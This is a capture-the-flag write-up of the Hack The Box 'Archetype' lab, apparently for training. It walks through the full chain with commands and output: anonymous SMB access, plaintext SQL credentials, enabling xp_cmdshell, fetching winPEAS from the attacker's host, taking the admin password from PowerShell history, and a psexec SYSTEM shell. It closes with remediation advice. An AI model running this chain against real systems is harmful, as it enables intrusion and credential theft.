# Archetype

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 2

**Summary:**
- A `backups` SMB share was readable without authentication and held an SSIS config file (`.dtsConfig`) with plaintext SQL credentials.
- With those I logged into MSSQL as `sql_svc` (a `sysadmin`), enabled `xp_cmdshell` and ran OS commands.
- The PowerShell history file contained the Administrator password, and `impacket-psexec` gave a shell as `NT AUTHORITY\SYSTEM`.

## 1. Reconnaissance

### 1.1 Port scan

```
┌──(julicc㉿diavlo)-[~]
└─$ nmap -sV 10.129.88.166
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-20 09:38 +0200
Nmap scan report for 10.129.88.166
Host is up (0.26s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

| **Port** | **Service** | **Version** | **State** |
|---|---|---|---|
| 135 | MSRPC | Microsoft Windows RPC | Open |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Open |
| 445 | Microsoft-DS | Windows Server 2008 R2 - 2012 | Open |
| 1433 | MS-SQL | Microsoft SQL Server 2017 14.00.1000 | Open |
| 5985 | HTTP (WinRM) | Microsoft HTTPAPI httpd 2.0 | Open |

### 1.2 SMB enumeration
Listing the shares with `smbclient`:

```
┌──(julicc㉿diavlo)-[~]
└─$ smbclient -L 10.129.88.166
Password for [WORKGROUP\julicc]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.88.166 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`backups` is accessible with a null session:

```
┌──(julicc㉿diavlo)-[~]
└─$ smbclient -N '\\10.129.88.166\backups'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

                5056511 blocks of size 4096. 2529067 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
```

### 1.3 Credentials in the SSIS config
`prod.dtsConfig` has SQL credentials in plaintext:

```xml
┌──(julicc㉿diavlo)-[~]
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

- **Credentials:** `ARCHETYPE\sql_svc:M3g4c0rp123`

## 2. Foothold

### 2.1 SQL Server access
I connected with `impacket-mssqlclient` using Windows authentication. The goal is a Transact-SQL shell with `xp_cmdshell`:

```
┌──(julicc㉿diavlo)-[~]
└─$ impacket-mssqlclient sql_svc:M3g4c0rp123@10.129.88.166 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
```

### 2.2 Enabling xp_cmdshell
First I checked the server role with `SELECT is_srvrolemember('sysadmin');`. Running `xp_cmdshell` straight away was blocked:

```
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell
ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

As `sysadmin` I can turn it on with `sp_configure`, enabling advanced options first:

```sql
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
```

### 2.3 Command execution

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
output
-----------------
archetype\sql_svc
NULL
```

## 3. Privilege Escalation

### 3.1 Local enumeration with winPEAS
I transferred `winPEAS.bat` to the server for local enumeration:

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.225:8000/winPEAS.bat -OutFile C:\Users\Public\winPEAS.bat -UseBasicParsing"';
output
------
NULL
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cmd C:\Users\Public\winPEAS.bat';
output
----------------------------------------------------
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.
NULL
```

![Pasted image 20260420103007](../../../Attachments/Pasted%20image%2020260420103007.png)

Running winPEAS:

![Pasted image 20260420104648](../../../Attachments/Pasted%20image%2020260420104648.png)

### 3.2 Credentials in the PowerShell history
winPEAS shows `SeImpersonatePrivilege`, which would also allow a Juicy Potato attack. Before going there I looked for stored credentials. `sql_svc` is both a regular user and a service account, so frequently used files and command history are worth checking.

PowerShell's history file is the Windows equivalent of `.bash_history`. `ConsoleHost_history.txt` lives in:

`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

- **Credentials:** `administrator:MEGACORP_4dm1n!!`

### 3.3 SYSTEM shell with impacket-psexec
With the Administrator password, psexec gives a shell as `NT AUTHORITY\SYSTEM`:

```
┌──(julicc㉿diavlo)-[~]
└─$ impacket-psexec administrator@10.129.88.166
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Requesting shares on 10.129.88.166.....
[*] Found writable share ADMIN$
[*] Uploading file YrXGIBHB.exe
[*] Opening SVCManager on 10.129.88.166.....
[*] Creating service KYBK on 10.129.88.166.....
[*] Starting service KYBK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Full compromise as `NT AUTHORITY\SYSTEM`.

## 4. Conclusion

**Severity:** Critical

**Chain:** null-session SMB share → plaintext SQL credentials → `sysadmin` on MSSQL → `xp_cmdshell` → admin password in PowerShell history → SYSTEM via psexec.

**Remediation:**
1. **No credentials in config files:** `.dtsConfig` files shouldn't hold plaintext passwords. Use a secrets store such as Azure Key Vault or Windows Credential Manager.
2. **Lock down SMB shares:** `backups` shouldn't allow null sessions. Apply restrictive ACLs.
3. **Keep xp_cmdshell disabled:** and grant `sysadmin` only to accounts that really need it.
4. **Mind the PowerShell history:** it can contain credentials. Set up automatic cleanup and never pass passwords as command-line arguments.
5. **Least privilege:** `sql_svc` shouldn't be `sysadmin`.
6. **Separate credentials:** don't reuse passwords between service and administrator accounts.
